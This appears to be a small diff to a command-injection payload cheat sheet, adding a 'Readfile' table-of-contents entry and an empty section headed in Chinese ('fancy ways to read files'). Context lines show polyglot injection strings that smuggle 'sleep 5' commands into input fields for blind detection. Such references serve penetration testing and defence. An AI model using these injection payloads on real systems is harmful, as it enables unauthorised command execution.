@@ -23,6 +23,7 @@
 * [Time based data exfiltration](#time-based-data-exfiltration)
 * [DNS based data exfiltration](#dns-based-data-exfiltration)
 * [Polyglot command injection](#polyglot-command-injection)
+* [Readfile](#readfile)
 * [References](#references)
     
 
@@ -263,6 +264,9 @@ echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"|
 echo "YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/"
 echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/'
 ```
+## Readfile
+花式读文件
+
 
 ## References
 
